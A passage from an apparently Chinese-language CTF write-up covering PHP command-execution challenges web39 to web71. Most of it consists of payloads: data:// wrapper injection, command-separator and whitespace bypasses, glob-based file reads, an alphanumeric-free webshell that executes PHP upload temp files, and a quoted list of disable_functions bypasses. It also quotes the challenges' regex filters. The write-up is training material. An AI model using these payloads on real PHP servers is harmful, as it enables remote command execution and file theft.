alt="chrome_cfkuWG65mH"></p><p>这道题限制了后缀</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=data://text/plain,&lt;?php system(&quot;cat f*&quot;)?&gt;</span><br></pre></td></tr></table></figure><p>相当于执行了php语句<code>&lt;?php system(&#39;cat f*&#39;)?&gt;.php</code><br>因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用</p><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737920.png" alt="chrome_KLlk8pWeRW"></p><p>这道题过滤了很多</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|[0-9]|\~|\`|@|\<span class="comment">#|\$|%|^|\&amp;|\*|\\|\-|=|\+|\&#123;|\[|\]|\&#125;|:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\|</span></span><br></pre></td></tr></table></figure><p>过滤了引号、美元符号、冒号，这里可以构造无参数函数进行文件读取</p><p>先get传参：<code>c=print_r(scandir(current(localeconv())));</code>查看当前目录所有文件名</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [<span class="number">0</span>] =&gt; . [<span class="number">1</span>] =&gt; .. [<span class="number">2</span>] =&gt; flag.php [<span class="number">3</span>] =&gt; index.php )</span><br></pre></td></tr></table></figure><p>可以发现flag.php在数组的倒数第二个值里,我们可以通过 array_reverse 进行逆转数组,然后用next()函数进行下一个值的读取,成功读取flag.php文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><h3 id="补充：无参数文件读取"><a href="#补充：无参数文件读取" class="headerlink" title="补充：无参数文件读取"></a>补充：无参数文件读取</h3><p>​                                                                                                                   <strong>–摘取自(<a href="https://www.cnblogs.com/NPFS/p/13778333.html">https://www.cnblogs.com/NPFS/p/13778333.html</a>)</strong></p><p>无参数的意思可以是a()、a(b())或a(b(c()))，但不能是a(‘b’)或a(‘b’,’c’)，不能带参数</p><h4 id="print-r-scandir-‘-’"><a href="#print-r-scandir-‘-’" class="headerlink" title="print_r(scandir(‘.’))"></a>print_r(scandir(‘.’))</h4><p>可以用来查看当前目录所有文件名</p><p>但是我们这里说的是要构造无参数的函数，所以我们要做的就是去掉这个点号</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">localeconv() 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line">current() 函数返回数组中的当前元素（单元）,默认取第一个值，</span><br><span class="line"><span class="keyword">pos</span>() 同 current() ,是current()的别名</span><br><span class="line"><span class="keyword">reset</span>() 函数返回数组第一个单元的值，如果数组为空则返回 FALSE</span><br></pre></td></tr></table></figure><p>**localeconv() ** 函数 返回数组的第一项就是 . (小数点)</p><p>我们可以通过读取该小数点代替print_r(scandir(‘.’))中的小数点 ，读取数组第一项可以的函数有current()、pos() 、reset()</p><p>所以最终我们可以构造如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">print_r(scandir(pos(localeconv())));</span><br><span class="line">print_r(scandir(reset(localeconv())));</span><br></pre></td></tr></table></figure><h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737921.png" alt="chrome_N84ShA8V3j"></p><p>这个题过滤了<code>$、+、-、^、~</code>使得<strong>异或、自增和取反</strong>构造字符都无法使用，同时还过滤了字母和数字。但是留了个或运算符<code>|</code></p><p>尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符，fuzz一下</p><p>从进行异或的字符中排除掉被过滤的，然后在判断异或得到的字符是否为可见字符，然后传递参数getflag</p><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737922.png" alt="cmd_UeDS60CT4e"></p><p><strong>ps：羽师傅出题实在精品，这题是后来回头再看慢慢理解出的，给师傅点赞了</strong></p><h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737923.png" alt="chrome_rT41TzTa2i"></p><p><strong>command &gt; /dev/null 2&gt;&amp;1</strong></p><p>通过三部分介绍该语句的函数就是将标准输出和标准错误输出重定向到伪设备<code>/dev/null</code>,它的作用就是执行某个命令将不会有任何日志输出。</p><p>我们要让命令回显，那么进行命令分隔即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;//分号</span><br><span class="line">|//只执行后面那条命令</span><br><span class="line">||//只执行前面那条命令</span><br><span class="line">&amp;//两条命令都会执行</span><br><span class="line">&amp;&amp;//两条命令都会执行</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：cat flag.php;</span><br></pre></td></tr></table></figure><h4 id="补充：要点分解"><a href="#补充：要点分解" class="headerlink" title="补充：要点分解"></a>补充：要点分解</h4><p>​                                                                                                        <strong>–摘取自<a href="https://blog.csdn.net/c_base_jin/article/details/87894722">https://blog.csdn.net/c_base_jin/article/details/87894722</a></strong></p><p>为了能理解<code>commond &gt; /dev/null 2&gt;&amp;1</code>命令的具体意思，我们将分三个要点进行介绍。</p><p>part 1 伪设备</p><p>在类Unix系统上的设备节点不一定必须与物理设备相对应。缺少此对应关系的节点构成伪设备组。它们提供操作系统处理的各种功能。一些最常用（基于字符的）伪设备包括：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/dev/null - 接受并丢弃所有输入; 不产生输出（总是在读取时返回文件结束指示）</span><br><span class="line">/dev/zero - 接受并丢弃所有输入; 产生连续的NUL（零值）字节流</span><br><span class="line">/dev/full - 读取时产生连续的NUL（零值）字节流，并在写入时返回“磁盘已满”消息</span><br><span class="line">/dev/random和/dev/urandom -它们产生的一个可变长度的数据流的伪随机数。</span><br></pre></td></tr></table></figure><p>part 2 文件描述符</p><p>在类unix系统中，当系统启动时就已经有三个标准文件流以及三个文件描述符被预先占用了，其对应关系如下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">名称     文件描述符  缩写设备</span><br><span class="line">标准输入   0   STDIN键盘</span><br><span class="line">标准输出   1   STDOUT屏幕</span><br><span class="line">标准错误输出    2     STDERR   屏幕</span><br></pre></td></tr></table></figure><p>当我们执行某个命令时，如果该命令执行正确并且有输出，则该命令的输出是在标准输出设备。如果该命令执行失败，类unix系统则会给出提示，该提示在标准错误设备输出。</p><p><strong>part 3 重定向</strong></p><p>重定向是把输出定向到文件或者标准流，重定向符有两个：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.&gt; 以覆盖的方式重定向输出到文件</span><br><span class="line"></span><br><span class="line">2.&gt;&gt;以追加的方式重定向输出到文件</span><br></pre></td></tr></table></figure><p>在之前也说过，若命令执行错误，标准错误输出也给出打印，若想要将标准错误输出不在屏幕输出，则需要使用重定向技术，将标准错误输出重定向到标准输出 <code>2&gt;&amp;1</code>：</p><p>&amp;是<strong>用来告诉系统1这里指的是标准输出，而不是文件</strong>。</p><h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737924.png" alt="chrome_fnIYPoD278"></p><p>比上题多过滤了cat和分号,替换下就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=tac flag.php%0a</span><br></pre></td></tr></table></figure><h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737925.png" alt="chrome_16eEJuShqS"></p><p>比上题多过滤了flag,绕过就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=tac fla*%0a</span><br></pre></td></tr></table></figure><h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737926.png" alt="chrome_kAWKE1cGdu"></p><p>比上题多过滤了空格,替换就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=tac%09fl*.php%0a</span><br></pre></td></tr></table></figure><h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737927.png" alt="chrome_LOEhAcLqtd"></p><p>比上题多过滤了数字和<code>$</code>和<code>*</code>,替换就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=tac%09fl[a-z]g.php||</span><br></pre></td></tr></table></figure><h2 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737928.png" alt="chrome_QKawdj6D8f"></p><p>比上题多过滤了<code>|more|less|head|sort|tail|</code>,不影响操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=tac%09fl[a-z]g.php||</span><br></pre></td></tr></table></figure><h2 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737930.png" alt="chrome_mGw3IMsXb8"></p><p>比上题多过滤了<code>|sed|cut|awk|strings|od|curl|\`|</code>，不影响操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=tac%09fl[a-z]g.php||</span><br></pre></td></tr></table></figure><h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737931.png" alt="chrome_95H7mKK28r"></p><p>比上题多过滤了<code>%</code>,用<code>&lt;&gt;</code>替换一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=tac&lt;fl[a-z]g.php||</span><br></pre></td></tr></table></figure><h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737932.png" alt="chrome_V0tRJ1q5Ui"></p><p>比上题多过滤了%09和%26,不知道为啥通配符用不了了，替换一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=tac&lt;fla\g.php||</span><br></pre></td></tr></table></figure><h2 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737933.png" alt="chrome_JOHjOEPkGt"></p><p>比上题多过滤了tac，替换一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=nl&lt;fla\g.php||</span><br></pre></td></tr></table></figure><h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737934.png" alt="chrome_AAaXDZSZeS"></p><p>这个题<code>&lt;&gt;</code>被过滤了但是<code>$</code>没过滤，替换一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=nl$&#123;IFS&#125;fla\g.php||</span><br></pre></td></tr></table></figure><p>发现不对flag_here,看一下根目录，<code>c=ls$&#123;IFS&#125;/||</code>,查看根目录下的flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=nl$&#123;IFS&#125;fla\g||</span><br></pre></td></tr></table></figure><h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737935.png" alt="chrome_yCHdHbvhHo"></p><p>多过滤了wget，但是没了命令分割</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=nl$&#123;IFS&#125;fla\g.php</span><br></pre></td></tr></table></figure><h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题太长了，直接把源码粘出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="built_in">test</span> *file   <span class="comment">#在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=grep$&#123;IFS&#125;&#x27;&#123;&#x27;$&#123;IFS&#125;fla?.php</span><br></pre></td></tr></table></figure><h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737936.png" alt="chrome_nE9fbnd0nW"></p><p>过滤了</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|;|小写字母|`|%|x09(空格)|x26(&amp;)|&lt;|&gt;|</span><br></pre></td></tr></table></figure><p>没有过滤数字，我们就想一想查看文件的命令有没有数字开头的。发现存在一个base64<br>我们就可以通过通配符进行匹配命令执行查看flag.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=/???/????64 ????.???</span><br></pre></td></tr></table></figure><p>意思是 <code>/bin/base64 flag.php</code></p><h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737937.png" alt="chrome_VAMNWtB321"></p><p>典型的无字母数字RCE，多过滤了</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|$|(|&#123;|<span class="string">&quot;|&#x27;|</span></span><br></pre></td></tr></table></figure><p>首先构造一个post上传文件的数据包,上传一个php文件，文件内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">cat /<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure><p>shell程序必须以<code>&quot;#!/bin/sh&quot;</code>开始，<code>#! /bin/sh </code>是指此脚本使用<code>/bin/sh</code>来解释执行，<code>#!</code>是特殊的表示符，其后面跟的是解释此脚本的shell的路径</p><p>上传php文件抓包</p><p>抓包之后添加参数<code>c=.%20/???/????????[@-[]</code>，多发包几次（因为并不一定生成的临时文件的最后一个字母就是大写字母），可以看到执行了命令</p><h4 id="补充P神师傅的无字母数字webshell，"><a href="#补充P神师傅的无字母数字webshell，" class="headerlink" title="补充P神师傅的无字母数字webshell，"></a>补充P神师傅的无字母数字webshell，</h4><p>​                                       <strong>–摘取自<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></strong></p><p>无字母、数字、<code>$</code>，在shell中仍然是一个难题。</p><p>此时我想到了两个有趣的Linux shell知识点：</p><ol><li>shell下可以利用<code>.</code>来执行任意脚本</li><li>Linux文件名支持用glob通配符代替</li></ol><p>第一点曾在《 <a href="https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html">小密圈里的那些奇技淫巧</a> 》露出过一角，但我没细讲。<code>.</code>或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则<code>. file</code>的意思就是用bash执行file文件中的命令。</p><p>用<code>. file</code>执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用<code>.</code>来执行它了吗？</p><p>这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</p><p>第二个难题接踵而至，执行<code>. /tmp/phpXXXXXX</code>，也是有字母的。此时就可以用到Linux下的glob通配符：</p><ul><li><code>*</code>可以代替0个及以上任意字符</li><li><code>?</code>可以代表1个任意字符</li></ul><p>那么，<code>/tmp/phpXXXXXX</code>就可以表示为<code>/*/?????????</code>或<code>/???/?????????</code>。</p><p>但我们尝试执行<code>. /???/?????????</code>，却得到错误</p><p>这是因为，能够匹配上<code>/???/?????????</code>这个通配符的文件有很多</p><p>所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。</p><p>翻开ascii码表，可见大写字母位于<code>@</code>与<code>[</code>之间，那么，我们可以利用<code>[@-[]</code>来表示大写字母</p><h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737938.png" alt="chrome_Z0y7xbPThJ"></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|;|[a-z]|[<span class="number">0</span>-<span class="number">9</span>]|`|\|#|<span class="comment">&#x27;|&quot;|`|%|x09|x26|x0a|&gt;|&lt;|.|,|?|*|-|=|[|</span></span><br></pre></td></tr></table></figure><p>过滤了很多，而且限制了后缀,不难理解只要让c=36即可</p><p>看师傅们厉害的绕过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo $&#123;_&#125; #返回上一次的执行结果`</span><br><span class="line">echo $(())    #0</span><br><span class="line">echo $((~$(())))     #~0是-1</span><br><span class="line"><span class="meta">$</span><span class="bash">(($((~$(())))$((~$(())))))     <span class="comment">#$((-1-1))即$$((-2))是-2</span></span></span><br><span class="line">echo $((~-37))       #~-37是36</span><br></pre></td></tr></table></figure><p>37个-1相减得到-37，再取反得到36</p><p>payload：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure><p>不得不说，师傅们的知识全面，以前根本不知道这个知识点</p><h2 id="web58-65"><a href="#web58-65" class="headerlink" title="web58-65"></a>web58-65</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737939.png" alt="chrome_ICAAvcyJkT"></p><p>这几个题都一样，经测试，system被禁用，执行命令的函数被禁用</p><p>我们尝试直接读取文件</p><p>php读文件的函数有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">readfile()读取文件</span><br><span class="line">fpassthru()读取文件</span><br><span class="line">highlight_file()读文件</span><br><span class="line">show_source()同上</span><br><span class="line">base64_decode()base64解码</span><br><span class="line">strrev()反转字符串</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=show_source(&#x27;flag.php&#x27;);</span><br></pre></td></tr></table></figure><h4 id="补充-羽师傅对于绕过disable-function的总结"><a href="#补充-羽师傅对于绕过disable-function的总结" class="headerlink" title="补充 羽师傅对于绕过disable function的总结"></a>补充 羽师傅对于绕过disable function的总结</h4><p>​                                                                                                                <strong>–摘取自<a href="https://blog.csdn.net/miuzzx/article/details/108619930">https://blog.csdn.net/miuzzx/article/details/108619930</a></strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">通过复制，重命名读取php文件内容（函数执行后，访问url/flag.txt）</span><br><span class="line">函数：</span><br><span class="line">copy()</span><br><span class="line">rename()</span><br><span class="line">用法：</span><br><span class="line">copy(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);             </span><br><span class="line">rename(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);           </span><br><span class="line"></span><br><span class="line">单一函数读文件内容：</span><br><span class="line">函数：</span><br><span class="line">file_get_contents()</span><br><span class="line">readfile()</span><br><span class="line">file()</span><br><span class="line">用法：</span><br><span class="line"><span class="built_in">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);           </span><br><span class="line">readfile(<span class="string">&quot;flag.php&quot;</span>);                         </span><br><span class="line">print_r(file(<span class="string">&quot;flag.php&quot;</span>));                    </span><br><span class="line"></span><br><span class="line">通过fopen读文件内容：</span><br><span class="line">函数：</span><br><span class="line">fread()</span><br><span class="line">fgets()</span><br><span class="line">fgetc()</span><br><span class="line">fgetss()</span><br><span class="line">fgetcsv()</span><br><span class="line">gpassthru()</span><br><span class="line">用法：</span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!feof(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = fgetss(<span class="variable">$a</span>);<span class="built_in">echo</span> <span class="variable">$line</span>;&#125;       //php7.3版本后 该函数已不再被使用</span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="built_in">echo</span> fpassthru(<span class="variable">$a</span>);                                      </span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="built_in">echo</span> fread(<span class="variable">$a</span>,<span class="string">&quot;1000&quot;</span>);                                   </span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!feof(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = fgets(<span class="variable">$a</span>);<span class="built_in">echo</span> <span class="variable">$line</span>;&#125;       </span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!feof(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = fgetc(<span class="variable">$a</span>);<span class="built_in">echo</span> <span class="variable">$line</span>;&#125;        </span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!feof(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = fgetcsv(<span class="variable">$a</span>);print_r(<span class="variable">$line</span>);&#125;  </span><br><span class="line"></span><br><span class="line">高亮显示php文件</span><br><span class="line">函数</span><br><span class="line">show_source()</span><br><span class="line">highlight_file()</span><br><span class="line">用法：</span><br><span class="line">show_source(<span class="string">&quot;flag.php&quot;</span>);                </span><br><span class="line">highlight_file(<span class="string">&quot;flag.php&quot;</span>);             </span><br></pre></td></tr></table></figure><h2 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737940.png" alt="chrome_ZlxsZmr1sE"></p><p>继续用show_source()，回显该函数被禁用</p><p>换一个继续读flag.php，发现位置不对，所以我们需要获取文件路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload：c=print_r(scandir(&quot;/&quot;));发现flag.txt</span><br><span class="line"></span><br><span class="line">payload：c=highlight_file(&#x27;/flag.txt&#x27;);拿到flag</span><br></pre></td></tr></table></figure><h2 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h2><p>题目相同</p><p>print_r()被禁用，换一个查目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(&quot;/&quot;));发现flag.txt</span><br><span class="line"></span><br><span class="line">payload：c=highlight_file(&#x27;/flag.txt&#x27;);拿到flag</span><br></pre></td></tr></table></figure><h2 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h2><p>题目相同</p><p>文件显示的函数，比如show_source、highlight_file、file_get_contents等基本都被禁了，这里换成文件包含的即可，如include、require</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(&quot;/&quot;));发现flag.txt</span><br><span class="line"></span><br><span class="line">payload：c=include(&#x27;/flag.txt&#x27;);拿到flag</span><br></pre></td></tr></table></figure><h2 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h2><p>var_dump()被禁用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(scandir(&quot;/&quot;));发现flag.txt</span><br><span class="line"></span><br><span class="line">payload：c=include(&#x27;/flag.txt&#x27;);拿到flag</span><br></pre></td></tr></table></figure><h2 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h2><p>error_reporting() 、 ini_set()、 highlight_file()被禁用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(scandir(&quot;/&quot;));发现flag.txt</span><br><span class="line"></span><br><span class="line">payload：c=include(&#x27;/flag.txt&#x27;);拿到flag</span><br></pre></td></tr></table></figure><h2 id="web71"><a 